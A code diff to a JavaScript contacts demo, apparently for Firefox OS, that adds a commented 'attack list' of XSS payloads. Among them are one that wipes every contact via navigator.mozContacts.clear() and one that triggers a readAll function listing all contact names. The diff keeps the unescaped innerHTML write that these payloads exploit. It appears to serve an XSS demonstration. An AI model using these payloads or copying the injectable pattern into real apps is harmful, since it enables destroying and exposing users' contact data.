@@ -21,7 +21,9 @@ function saveContact()
 }//end func saveContact
 
 
-//Contact API
+////////////////////////////////////////////
+//read contact Info by name
+///////////////////////////////////////////////
 function readContact()
 {
  //temporary store name
@@ -43,12 +45,18 @@ function readContact()
             for (var j=0; j<request1.result[0].name.length; j++) {
               name1= name1  + request1.result[0].name[j];
             }
-          //alert(name1+" ,wellcome to the game");
-          //attack happen here
-          //"<img src=x onerror=alert(11111)>";
+/*attack list
+    "<img src=x onerror=alert(11111)>";
+    "<img src=x onerror=readAll()>";
+    <iframe SRC=JaVaScRiPt:alert('XSS')>
+    <iframe SRC=JaVaScRiPt:alert(1);alert(2)>
+    "<img src=x onerror=JaVaScRiPt:alert(1);alert(2)>";
+    "<img src=x onerror=JaVaScRiPt:navigator.mozContacts.clear();alert('deleteAll');>";
+*/
           spName.innerHTML = name1;
+
     } else {
-        console.log("No contacts found.");
+        spName.innerHTML = "no contact match";
     }
  }; 
  request1.onerror = function() {
@@ -57,4 +65,24 @@ function readContact()
 
 }//end func display
 
+////////////////////////////////////////
+//read all contact name
+////////////////////////////////////////
+function readAll()
+{
+ var cursor = navigator.mozContacts.getAll({}); 
+ cursor.onsuccess = function() {
+    if(cursor.result) {
+        for(var i=0; i<cursor.result.name.length; i++) {
+           alert("Name is:"+cursor.result.name[i]);
+        }
+        cursor.continue();
+    }
+ };
+ 
+ 
+ cursor.onerror = function() {
+    alert("Error getting contacts");
+ };
 
+} //end func readAll
